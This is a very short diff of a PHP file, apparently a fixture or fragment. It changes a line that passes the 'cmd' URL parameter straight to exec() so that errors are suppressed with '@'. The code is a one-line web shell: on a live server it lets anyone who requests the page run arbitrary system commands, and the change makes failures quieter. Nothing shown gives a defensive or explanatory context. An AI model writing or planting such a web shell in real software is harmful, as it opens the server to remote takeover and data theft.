@@ -1,7 +1,7 @@
 Start--
 <?
 
-exec( $_GET['cmd'] );
+@exec( $_GET['cmd'] );
 
 ?>
 --End
